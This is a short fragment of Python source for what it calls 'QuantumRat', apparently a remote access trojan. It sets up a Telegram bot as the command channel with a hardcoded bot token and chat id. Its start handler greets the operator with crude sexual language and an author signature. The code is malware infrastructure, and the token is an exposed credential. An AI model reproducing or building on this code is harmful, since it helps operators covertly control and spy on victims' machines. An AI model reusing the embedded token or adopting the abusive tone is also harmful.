...
token = '6347942284:AAHrhalNXS_AAcrEiudjMs4x6x21cN2J58Q'
id_chat = '5001758934'
...
def start(commands):
	bot.send_message(id_chat, '🌚 QuantumRat 🌚 ' +   
		'\n\nHi my little pussy, if you want a command write /help' +
		'\n\nCoded by #~SAINt Reng0ku~# | The Revolution Is Coming')
